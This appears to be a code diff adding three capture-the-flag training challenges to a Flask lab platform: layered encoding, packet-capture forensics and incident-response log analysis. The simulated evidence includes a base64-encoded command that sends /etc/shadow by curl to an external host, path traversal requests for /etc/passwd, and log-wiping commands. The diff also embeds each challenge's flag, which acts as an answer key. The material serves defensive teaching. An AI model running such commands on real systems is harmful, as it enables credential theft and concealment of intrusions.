@@ -108,6 +108,48 @@ CHALLENGES = [
                  "Can you get insider access?"),
         "hint": "Look at the footer. Who works at this company? What makes them different?",
     },
+    {
+        "id": "base64-layers",
+        "name": "Decode the Layers",
+        "category": "Crypto",
+        "difficulty": "Easy",
+        "points": 100,
+        "flag": "FLAG{b4s3_s1xty_f0ur_l4y3rs}",
+        "port": 8003,
+        "env": "CRYPTO1_URL",
+        "desc": ("An intercepted message was encoded multiple times before "
+                 "transmission. Can you peel back all the layers to reveal "
+                 "the original secret?"),
+        "hint": "It's not just one encoding — try decoding several times. Check for Base64, hex, and more.",
+    },
+    {
+        "id": "pcap-hunt",
+        "name": "Packet Hunter",
+        "category": "Digital Forensics",
+        "difficulty": "Medium",
+        "points": 200,
+        "flag": "FLAG{p4ck3t_c4ptur3_s3cr3t}",
+        "port": 8004,
+        "env": "PCAP_URL",
+        "desc": ("A suspicious network capture was found on a compromised server. "
+                 "Analyze the traffic to find the exfiltrated secret hidden "
+                 "inside the packets."),
+        "hint": "Look at the HTTP traffic. The attacker hid data in an unusual header.",
+    },
+    {
+        "id": "log-analysis",
+        "name": "Incident Investigator",
+        "category": "Incident Response",
+        "difficulty": "Medium",
+        "points": 200,
+        "flag": "FLAG{1nc1d3nt_r3sp0ns3_l0g_4n4lys1s}",
+        "port": 8005,
+        "env": "IR_URL",
+        "desc": ("Your SOC received an alert about a breach. Server logs show "
+                 "suspicious activity. Analyze the logs to find the attacker's "
+                 "action that reveals the flag."),
+        "hint": "The attacker encoded their payload. Look for Base64 strings in the commands.",
+    },
 ]
 CH_BY_ID = {c["id"]: c for c in CHALLENGES}
 
@@ -146,6 +188,399 @@ def lab_corpleak_register():
 @app.route("/lab/corporateleak/api/login", methods=["POST"])
 def lab_corpleak_login():
     return _corpleak.login()
+
+
+# ----------- Crypto: Decode the Layers (in-process) -----------
+import base64 as _b64
+import binascii as _binascii
+
+_CRYPTO_FLAG = "FLAG{b4s3_s1xty_f0ur_l4y3rs}"
+_CRYPTO_ENCODED = _b64.b64encode(
+    _binascii.hexlify(
+        _b64.b64encode(
+            _b64.b64encode(_CRYPTO_FLAG.encode()).decode().encode()
+        )
+    )
+).decode()
+
+_CRYPTO_PAGE = r"""
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Decode the Layers</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0f172a;--card:rgba(15,23,42,.9);--border:rgba(148,163,184,.12);
+  --text:#e2e8f0;--text2:#64748b;--amber:#f59e0b;--amber2:#d97706;
+  --green:#22c55e;--red:#ef4444;--font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font:15px/1.6 var(--font);min-height:100vh;
+  display:grid;place-items:center;padding:16px}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;
+  background:radial-gradient(ellipse at 50% -20%,rgba(245,158,11,.08),transparent 70%)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;
+  padding:36px;width:min(92vw,600px);backdrop-filter:blur(12px)}
+.badge{display:inline-block;font:600 11px var(--mono);letter-spacing:1.5px;
+  text-transform:uppercase;color:var(--amber);padding:4px 12px;
+  border:1px solid rgba(245,158,11,.25);border-radius:6px;margin-bottom:16px}
+h1{font-size:26px;font-weight:800;margin-bottom:4px}
+.sub{color:var(--text2);font-size:14px;margin-bottom:24px}
+.cipher{background:rgba(0,0,0,.4);border:1px solid var(--border);border-radius:10px;
+  padding:18px;margin:16px 0;font:13px var(--mono);word-break:break-all;color:var(--amber);
+  line-height:1.7;user-select:all;max-height:200px;overflow-y:auto}
+label{color:var(--text2);font-size:13px;font-weight:600;display:block;margin-bottom:6px}
+input{width:100%;padding:12px 14px;margin-bottom:14px;background:rgba(0,0,0,.3);
+  border:1px solid var(--border);border-radius:10px;color:var(--text);font:14px var(--mono);outline:none}
+input:focus{border-color:var(--amber);box-shadow:0 0 0 3px rgba(245,158,11,.15)}
+.btn{display:block;width:100%;padding:13px;border:0;border-radius:10px;
+  background:linear-gradient(135deg,var(--amber2),var(--amber));color:#fff;
+  font:700 15px var(--font);cursor:pointer}
+.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(245,158,11,.3)}
+#out{margin-top:16px;font:14px var(--mono);padding:14px;border-radius:10px;display:none;
+  word-break:break-all;border:1px solid}
+.win{background:rgba(34,197,94,.08);color:var(--green);border-color:rgba(34,197,94,.25)!important;display:block!important}
+.bad{background:rgba(239,68,68,.08);color:var(--red);border-color:rgba(239,68,68,.25)!important;display:block!important}
+.hint{color:var(--text2);font-size:12px;margin-top:20px;padding:12px;
+  border:1px dashed rgba(148,163,184,.15);border-radius:8px}
+code{color:var(--amber);font-family:var(--mono)}
+.layers{display:flex;gap:8px;margin:12px 0;flex-wrap:wrap}
+.layer{padding:6px 14px;border:1px solid var(--border);border-radius:8px;font:12px var(--mono);color:var(--text2)}
+</style></head><body>
+<div class="card">
+  <span class="badge">Crypto &middot; Encoding</span>
+  <h1>Decode the Layers</h1>
+  <p class="sub">An intercepted message was encoded multiple times. Peel back the layers.</p>
+
+  <p style="color:var(--text2);font-size:13px;margin-bottom:8px"><b>Intercepted ciphertext:</b></p>
+  <div class="cipher">ENCODED_DATA_PLACEHOLDER</div>
+
+  <p style="color:var(--text2);font-size:13px;margin-bottom:8px"><b>Encoding layers used (in order):</b></p>
+  <div class="layers">
+    <span class="layer">1. Base64</span>
+    <span class="layer">2. Base64</span>
+    <span class="layer">3. Hex</span>
+    <span class="layer">4. Base64</span>
+  </div>
+
+  <hr style="border:0;border-top:1px solid var(--border);margin:20px 0">
+
+  <label>Decoded message</label>
+  <input id="ans" placeholder="FLAG{...}" autocomplete="off">
+  <button class="btn" onclick="check()">Submit Answer</button>
+  <div id="out"></div>
+
+  <div class="hint">
+    <b>How to solve:</b><br>
+    &bull; Copy the ciphertext<br>
+    &bull; Reverse the encoding layers: decode Base64 first (outermost), then Hex, then Base64, then Base64<br>
+    &bull; Use <code>CyberChef</code>, <code>Python</code>, or command-line tools<br>
+    &bull; Python: <code>import base64, binascii</code>
+  </div>
+</div>
+<script>
+const out=document.getElementById('out');
+async function check(){
+  const a=document.getElementById('ans').value.trim();
+  if(!a)return;out.className='';out.style.display='none';
+  const r=await fetch('/lab/base64-layers/check',{method:'POST',
+    headers:{'Content-Type':'application/json'},body:JSON.stringify({answer:a})});
+  const d=await r.json();
+  if(d.correct){out.className='win';out.innerHTML='<b>Correct!</b> '+d.flag+'<br><span style="font-size:11px;opacity:.7">Submit this flag on the CTF platform.</span>'}
+  else{out.className='bad';out.textContent=d.error||'Wrong answer'}
+}
+</script>
+</body></html>
+"""
+
+@app.route("/lab/base64-layers/")
+def lab_crypto1():
+    page = _CRYPTO_PAGE.replace("ENCODED_DATA_PLACEHOLDER", _CRYPTO_ENCODED)
+    return render_template_string(page)
+
+@app.route("/lab/base64-layers/check", methods=["POST"])
+def lab_crypto1_check():
+    data = request.get_json(silent=True) or {}
+    answer = (data.get("answer") or "").strip()
+    if answer == _CRYPTO_FLAG:
+        return jsonify(correct=True, flag=_CRYPTO_FLAG)
+    return jsonify(correct=False, error="Wrong answer. Keep decoding!"), 400
+
+
+# ----------- Digital Forensics: Packet Hunter (in-process) -----------
+_PCAP_FLAG = "FLAG{p4ck3t_c4ptur3_s3cr3t}"
+_PCAP_B64 = _b64.b64encode(_PCAP_FLAG.encode()).decode()
+
+_PCAP_LOGS = [
+    {"id":1,"time":"2026-10-09 14:32:01","src":"192.168.1.105","dst":"10.0.0.50","proto":"TCP","port":443,"info":"TLS Client Hello → server.internal.corp","size":"517"},
+    {"id":2,"time":"2026-10-09 14:32:02","src":"10.0.0.50","dst":"192.168.1.105","proto":"TCP","port":443,"info":"TLS Server Hello, Certificate","size":"2841"},
+    {"id":3,"time":"2026-10-09 14:32:05","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"GET /api/health HTTP/1.1","size":"312"},
+    {"id":4,"time":"2026-10-09 14:32:05","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — {\"status\":\"up\"}","size":"198"},
+    {"id":5,"time":"2026-10-09 14:32:08","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"POST /api/login HTTP/1.1 — user=admin&pass=admin123","size":"445"},
+    {"id":6,"time":"2026-10-09 14:32:08","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — {\"token\":\"eyJhbGciOiJIUzI1NiJ9...\"}","size":"523"},
+    {"id":7,"time":"2026-10-09 14:32:12","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"GET /api/files?path=/etc/shadow HTTP/1.1","size":"378"},
+    {"id":8,"time":"2026-10-09 14:32:12","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 403 Forbidden","size":"156"},
+    {"id":9,"time":"2026-10-09 14:32:15","src":"192.168.1.105","dst":"10.0.0.50","proto":"HTTP","port":80,"info":"GET /api/files?path=....//....//etc/passwd HTTP/1.1","size":"401"},
+    {"id":10,"time":"2026-10-09 14:32:15","src":"10.0.0.50","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — root:x:0:0:root:/root:/bin/bash...","size":"1847"},
+    {"id":11,"time":"2026-10-09 14:32:20","src":"192.168.1.105","dst":"10.0.0.50","proto":"DNS","port":53,"info":"A? exfil.attacker.com","size":"78"},
+    {"id":12,"time":"2026-10-09 14:32:20","src":"10.0.0.50","dst":"192.168.1.105","proto":"DNS","port":53,"info":"A exfil.attacker.com → 203.0.113.66","size":"94"},
+    {"id":13,"time":"2026-10-09 14:32:22","src":"192.168.1.105","dst":"203.0.113.66","proto":"HTTP","port":80,"info":"POST /collect HTTP/1.1 — X-Exfil-Data: " + _PCAP_B64,"size":"612"},
+    {"id":14,"time":"2026-10-09 14:32:22","src":"203.0.113.66","dst":"192.168.1.105","proto":"HTTP","port":80,"info":"HTTP 200 OK — {\"received\":true}","size":"143"},
+    {"id":15,"time":"2026-10-09 14:32:25","src":"192.168.1.105","dst":"10.0.0.50","proto":"TCP","port":22,"info":"SSH Connection closed","size":"66"},
+]
+
+_PCAP_PAGE = r"""
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Packet Hunter</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0f172a;--card:rgba(15,23,42,.9);--border:rgba(148,163,184,.12);
+  --text:#e2e8f0;--text2:#64748b;--blue:#3b82f6;--blue2:#2563eb;
+  --green:#22c55e;--red:#ef4444;--font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font:15px/1.6 var(--font);min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;padding:32px 16px}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;
+  background:radial-gradient(ellipse at 50% -20%,rgba(59,130,246,.08),transparent 70%)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;
+  padding:32px;width:min(96vw,900px);backdrop-filter:blur(12px);margin-bottom:20px}
+.badge{display:inline-block;font:600 11px var(--mono);letter-spacing:1.5px;
+  text-transform:uppercase;color:var(--blue);padding:4px 12px;
+  border:1px solid rgba(59,130,246,.25);border-radius:6px;margin-bottom:16px}
+h1{font-size:26px;font-weight:800;margin-bottom:4px}
+.sub{color:var(--text2);font-size:14px;margin-bottom:24px}
+table{width:100%;border-collapse:collapse;font-size:12px;margin:16px 0}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--border);font-family:var(--mono)}
+th{color:var(--text2);font-size:10px;text-transform:uppercase;letter-spacing:1px;position:sticky;top:0;background:var(--bg)}
+tr:hover{background:rgba(59,130,246,.04)}
+.http{color:var(--green)}.dns{color:var(--blue)}.tcp{color:var(--text2)}.tls{color:#a78bfa}
+.info-cell{max-width:400px;word-break:break-all}
+.highlight{background:rgba(239,68,68,.08)!important;color:var(--red)}
+label{color:var(--text2);font-size:13px;font-weight:600;display:block;margin-bottom:6px}
+input{width:100%;padding:12px 14px;margin-bottom:14px;background:rgba(0,0,0,.3);
+  border:1px solid var(--border);border-radius:10px;color:var(--text);font:14px var(--mono);outline:none}
+input:focus{border-color:var(--blue);box-shadow:0 0 0 3px rgba(59,130,246,.15)}
+.btn{display:block;width:100%;padding:13px;border:0;border-radius:10px;
+  background:linear-gradient(135deg,var(--blue2),var(--blue));color:#fff;
+  font:700 15px var(--font);cursor:pointer}
+.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(59,130,246,.3)}
+#out{margin-top:16px;font:14px var(--mono);padding:14px;border-radius:10px;display:none;
+  word-break:break-all;border:1px solid}
+.win{background:rgba(34,197,94,.08);color:var(--green);border-color:rgba(34,197,94,.25)!important;display:block!important}
+.bad{background:rgba(239,68,68,.08);color:var(--red);border-color:rgba(239,68,68,.25)!important;display:block!important}
+.hint{color:var(--text2);font-size:12px;margin-top:20px;padding:12px;
+  border:1px dashed rgba(148,163,184,.15);border-radius:8px}
+code{color:var(--blue);font-family:var(--mono)}
+.scroll{max-height:400px;overflow-y:auto;border:1px solid var(--border);border-radius:10px}
+</style></head><body>
+<div class="card">
+  <span class="badge">Forensics &middot; Network</span>
+  <h1>Packet Hunter</h1>
+  <p class="sub">Analyze the captured network traffic. The attacker exfiltrated a secret — find it.</p>
+
+  <div class="scroll">
+    <table>
+      <thead><tr><th>#</th><th>Time</th><th>Source</th><th>Dest</th><th>Proto</th><th>Port</th><th>Info</th><th>Size</th></tr></thead>
+      <tbody>
+      {% for p in packets %}
+        <tr class="{{ 'highlight' if 'exfil' in p.info.lower() or 'shadow' in p.info.lower() or 'passwd' in p.info.lower() }}">
+          <td>{{ p.id }}</td>
+          <td>{{ p.time.split(' ')[1] }}</td>
+          <td>{{ p.src }}</td>
+          <td>{{ p.dst }}</td>
+          <td><span class="{{ p.proto.lower() }}">{{ p.proto }}</span></td>
+          <td>{{ p.port }}</td>
+          <td class="info-cell">{{ p.info }}</td>
+          <td>{{ p.size }}</td>
+        </tr>
+      {% endfor %}
+      </tbody>
+    </table>
+  </div>
+
+  <hr style="border:0;border-top:1px solid var(--border);margin:20px 0">
+
+  <label>What secret did the attacker exfiltrate?</label>
+  <input id="ans" placeholder="FLAG{...}" autocomplete="off">
+  <button class="btn" onclick="check()">Submit Answer</button>
+  <div id="out"></div>
+
+  <div class="hint">
+    <b>Investigation guide:</b><br>
+    &bull; Look for suspicious outbound connections to external IPs<br>
+    &bull; Check for unusual HTTP headers — attackers often hide data in custom headers<br>
+    &bull; The data might be encoded — try <code>Base64</code> decoding<br>
+    &bull; Packet #13 looks interesting...
+  </div>
+</div>
+<script>
+const out=document.getElementById('out');
+async function check(){
+  const a=document.getElementById('ans').value.trim();
+  if(!a)return;out.className='';out.style.display='none';
+  const r=await fetch('/lab/pcap-hunt/check',{method:'POST',
+    headers:{'Content-Type':'application/json'},body:JSON.stringify({answer:a})});
+  const d=await r.json();
+  if(d.correct){out.className='win';out.innerHTML='<b>Correct!</b> '+d.flag+'<br><span style="font-size:11px;opacity:.7">Submit this flag on the CTF platform.</span>'}
+  else{out.className='bad';out.textContent=d.error||'Wrong answer'}
+}
+</script>
+</body></html>
+"""
+
+@app.route("/lab/pcap-hunt/")
+def lab_pcap():
+    return render_template_string(_PCAP_PAGE, packets=_PCAP_LOGS)
+
+@app.route("/lab/pcap-hunt/check", methods=["POST"])
+def lab_pcap_check():
+    data = request.get_json(silent=True) or {}
+    answer = (data.get("answer") or "").strip()
+    if answer == _PCAP_FLAG:
+        return jsonify(correct=True, flag=_PCAP_FLAG)
+    return jsonify(correct=False, error="Wrong answer. Look closer at the packets!"), 400
+
+
+# ----------- IR: Incident Investigator (in-process) -----------
+_IR_FLAG = "FLAG{1nc1d3nt_r3sp0ns3_l0g_4n4lys1s}"
+_IR_B64_CMD = _b64.b64encode(("cat /etc/shadow | curl -X POST -d @- http://203.0.113.66/collect && echo '" + _IR_FLAG + "' > /tmp/.hidden").encode()).decode()
+
+_IR_LOGS = [
+    {"ts":"2026-10-09 02:14:33","host":"web-prod-01","svc":"sshd","msg":"Accepted publickey for deploy from 10.0.1.50 port 48221 ssh2"},
+    {"ts":"2026-10-09 02:14:35","host":"web-prod-01","svc":"sudo","msg":"deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/systemctl restart nginx"},
+    {"ts":"2026-10-09 03:41:02","host":"web-prod-01","svc":"sshd","msg":"Failed password for root from 185.143.223.47 port 39201 ssh2"},
+    {"ts":"2026-10-09 03:41:04","host":"web-prod-01","svc":"sshd","msg":"Failed password for root from 185.143.223.47 port 39203 ssh2"},
+    {"ts":"2026-10-09 03:41:06","host":"web-prod-01","svc":"sshd","msg":"Failed password for admin from 185.143.223.47 port 39205 ssh2"},
+    {"ts":"2026-10-09 03:41:15","host":"web-prod-01","svc":"sshd","msg":"Failed password for root from 185.143.223.47 port 39211 ssh2"},
+    {"ts":"2026-10-09 03:42:01","host":"web-prod-01","svc":"sshd","msg":"Accepted password for www-data from 185.143.223.47 port 39280 ssh2"},
+    {"ts":"2026-10-09 03:42:05","host":"web-prod-01","svc":"sudo","msg":"www-data : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash"},
+    {"ts":"2026-10-09 03:42:12","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# whoami → root"},
+    {"ts":"2026-10-09 03:42:18","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# cat /etc/hostname → web-prod-01"},
+    {"ts":"2026-10-09 03:42:25","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# uname -a → Linux web-prod-01 5.15.0-91-generic"},
+    {"ts":"2026-10-09 03:42:31","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# cat /etc/passwd | wc -l → 42"},
+    {"ts":"2026-10-09 03:42:40","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# echo " + _IR_B64_CMD + " | base64 -d | bash"},
+    {"ts":"2026-10-09 03:42:42","host":"web-prod-01","svc":"curl","msg":"POST http://203.0.113.66/collect — 200 OK (sent 2.4KB)"},
+    {"ts":"2026-10-09 03:42:50","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# rm -rf /var/log/auth.log.1 /var/log/syslog.1"},
+    {"ts":"2026-10-09 03:42:55","host":"web-prod-01","svc":"bash","msg":"root@web-prod-01:/# history -c && exit"},
+    {"ts":"2026-10-09 03:42:56","host":"web-prod-01","svc":"sshd","msg":"session closed for user www-data"},
+    {"ts":"2026-10-09 06:00:01","host":"web-prod-01","svc":"cron","msg":"CRON: (root) CMD (/usr/local/bin/backup.sh)"},
+]
+
+_IR_PAGE = r"""
+<!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Incident Investigator</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#0f172a;--card:rgba(15,23,42,.9);--border:rgba(148,163,184,.12);
+  --text:#e2e8f0;--text2:#64748b;--red:#ef4444;--red2:#dc2626;
+  --green:#22c55e;--orange:#f59e0b;--font:'Inter',sans-serif;--mono:'JetBrains Mono',monospace}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font:15px/1.6 var(--font);min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;padding:32px 16px}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;
+  background:radial-gradient(ellipse at 50% -20%,rgba(239,68,68,.08),transparent 70%)}
+.card{background:var(--card);border:1px solid var(--border);border-radius:16px;
+  padding:32px;width:min(96vw,900px);backdrop-filter:blur(12px);margin-bottom:20px}
+.badge{display:inline-block;font:600 11px var(--mono);letter-spacing:1.5px;
+  text-transform:uppercase;color:var(--red);padding:4px 12px;
+  border:1px solid rgba(239,68,68,.25);border-radius:6px;margin-bottom:16px}
+h1{font-size:26px;font-weight:800;margin-bottom:4px}
+.sub{color:var(--text2);font-size:14px;margin-bottom:24px}
+.alert-banner{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.25);
+  border-radius:10px;padding:14px 18px;margin-bottom:20px;display:flex;align-items:center;gap:12px}
+.alert-banner .icon{font-size:24px}
+.alert-banner .msg{font-size:13px;color:var(--red)}
+.alert-banner .msg b{color:var(--text)}
+.log-box{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:10px;
+  padding:0;margin:16px 0;max-height:450px;overflow-y:auto;font:12px var(--mono)}
+.log-line{padding:6px 14px;border-bottom:1px solid rgba(148,163,184,.06);display:flex;gap:8px;
+  transition:background .15s}
+.log-line:hover{background:rgba(148,163,184,.04)}
+.log-ts{color:var(--text2);min-width:140px;white-space:nowrap}
+.log-host{color:var(--green);min-width:100px}
+.log-svc{color:var(--orange);min-width:50px}
+.log-msg{color:var(--text);flex:1;word-break:break-all}
+.log-line.suspicious{background:rgba(239,68,68,.06)}
+.log-line.suspicious .log-msg{color:var(--red)}
+label{color:var(--text2);font-size:13px;font-weight:600;display:block;margin-bottom:6px}
+input{width:100%;padding:12px 14px;margin-bottom:14px;background:rgba(0,0,0,.3);
+  border:1px solid var(--border);border-radius:10px;color:var(--text);font:14px var(--mono);outline:none}
+input:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(239,68,68,.15)}
+.btn{display:block;width:100%;padding:13px;border:0;border-radius:10px;
+  background:linear-gradient(135deg,var(--red2),var(--red));color:#fff;
+  font:700 15px var(--font);cursor:pointer}
+.btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(239,68,68,.3)}
+#out{margin-top:16px;font:14px var(--mono);padding:14px;border-radius:10px;display:none;
+  word-break:break-all;border:1px solid}
+.win{background:rgba(34,197,94,.08);color:var(--green);border-color:rgba(34,197,94,.25)!important;display:block!important}
+.bad{background:rgba(239,68,68,.08);color:var(--red);border-color:rgba(239,68,68,.25)!important;display:block!important}
+.hint{color:var(--text2);font-size:12px;margin-top:20px;padding:12px;
+  border:1px dashed rgba(148,163,184,.15);border-radius:8px}
+code{color:var(--red);font-family:var(--mono)}
+</style></head><body>
+<div class="card">
+  <span class="badge">IR &middot; Log Analysis</span>
+  <h1>Incident Investigator</h1>
+  <p class="sub">Analyze the server logs from a confirmed breach. Find the attacker's hidden flag.</p>
+
+  <div class="alert-banner">
+    <span class="icon">🚨</span>
+    <div class="msg"><b>ALERT — Unauthorized root access detected on web-prod-01</b><br>
+    Time: 2026-10-09 03:42 UTC &bull; Source: 185.143.223.47 &bull; Severity: CRITICAL</div>
+  </div>
+
+  <div class="log-box">
+    {% for log in logs %}
+    <div class="log-line {{ 'suspicious' if '185.143' in log.msg or 'base64' in log.msg.lower() or 'rm -rf' in log.msg or 'history -c' in log.msg }}">
+      <span class="log-ts">{{ log.ts }}</span>
+      <span class="log-host">{{ log.host }}</span>
+      <span class="log-svc">[{{ log.svc }}]</span>
+      <span class="log-msg">{{ log.msg }}</span>
+    </div>
+    {% endfor %}
+  </div>
+
+  <hr style="border:0;border-top:1px solid var(--border);margin:20px 0">
+
+  <label>What flag did the attacker leave behind?</label>
+  <input id="ans" placeholder="FLAG{...}" autocomplete="off">
+  <button class="btn" onclick="check()">Submit Answer</button>
+  <div id="out"></div>
+
+  <div class="hint">
+    <b>Investigation steps:</b><br>
+    &bull; Follow the timeline — how did the attacker get in?<br>
+    &bull; Look for encoded commands — <code>base64 -d | bash</code> is a red flag<br>
+    &bull; Decode the Base64 string to see what the attacker actually executed<br>
+    &bull; The flag is embedded in the decoded command
+  </div>
+</div>
+<script>
+const out=document.getElementById('out');
+async function check(){
+  const a=document.getElementById('ans').value.trim();
+  if(!a)return;out.className='';out.style.display='none';
+  const r=await fetch('/lab/log-analysis/check',{method:'POST',
+    headers:{'Content-Type':'application/json'},body:JSON.stringify({answer:a})});
+  const d=await r.json();
+  if(d.correct){out.className='win';out.innerHTML='<b>Case closed!</b> '+d.flag+'<br><span style="font-size:11px;opacity:.7">Submit this flag on the CTF platform.</span>'}
+  else{out.className='bad';out.textContent=d.error||'Wrong answer'}
+}
+</script>
+</body></html>
+"""
+
+@app.route("/lab/log-analysis/")
+def lab_ir():
+    return render_template_string(_IR_PAGE, logs=_IR_LOGS)
+
+@app.route("/lab/log-analysis/check", methods=["POST"])
+def lab_ir_check():
+    data = request.get_json(silent=True) or {}
+    answer = (data.get("answer") or "").strip()
+    if answer == _IR_FLAG:
+        return jsonify(correct=True, flag=_IR_FLAG)
+    return jsonify(correct=False, error="Wrong answer. Decode the attacker's command!"), 400
 
 
 class PgRowWrapper:
@@ -1147,6 +1582,18 @@ def challenge(cid):
             <li><div><b>Open the corporate portal</b><span>The target is a company's internal portal. Register and explore what's available.</span></div></li>
             <li><div><b>Investigate the access model</b><span>Why are some users treated differently? Look at the page carefully for clues.</span></div></li>
             <li><div><b>Gain insider access</b><span>Find a way to access the restricted financial reports and extract the company's annual profit.</span></div></li>
+            {% elif c['category'] == 'Crypto' %}
+            <li><div><b>Read the ciphertext</b><span>Open the challenge and examine the encoded data.</span></div></li>
+            <li><div><b>Identify the encoding</b><span>Figure out which encoding methods were used (Base64, Hex, ROT13, etc.).</span></div></li>
+            <li><div><b>Decode layer by layer</b><span>Reverse each encoding step to reveal the hidden flag.</span></div></li>
+            {% elif c['category'] == 'Digital Forensics' %}
+            <li><div><b>Examine the evidence</b><span>Open the challenge and study the captured data carefully.</span></div></li>
+            <li><div><b>Follow the trail</b><span>Look for anomalies, suspicious patterns, and hidden data in the evidence.</span></div></li>
+            <li><div><b>Extract the secret</b><span>Decode or extract the hidden information to find the flag.</span></div></li>
+            {% elif c['category'] == 'Incident Response' %}
+            <li><div><b>Review the logs</b><span>Open the challenge and study the server logs timeline.</span></div></li>
+            <li><div><b>Trace the attack</b><span>Follow the attacker's steps — how did they get in? What did they do?</span></div></li>
+            <li><div><b>Decode the payload</b><span>Find and decode the attacker's hidden payload to extract the flag.</span></div></li>
             {% else %}
             <li><div><b>Open the target</b><span>The challenge runs on its own server. Click the link below to open it.</span></div></li>
             <li><div><b>Find the vulnerability</b><span>Proxy your browser through Burp Suite and analyze what the page sends.</span></div></li>
